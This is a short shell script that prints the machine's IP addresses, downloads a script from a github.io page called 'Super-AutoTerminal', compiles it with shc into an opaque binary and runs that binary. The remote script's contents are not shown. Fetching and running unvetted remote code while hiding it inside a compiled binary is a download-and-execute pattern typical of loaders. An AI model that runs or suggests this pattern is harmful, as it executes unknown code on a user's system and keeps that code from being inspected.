echo "Running from $(hostname -I)"
curl -sSL https://cool-guys-bfc2.github.io/Super-AutoTerminal/script.sh -o script.sh
shc -f script.sh -o my_binary
./my_binary
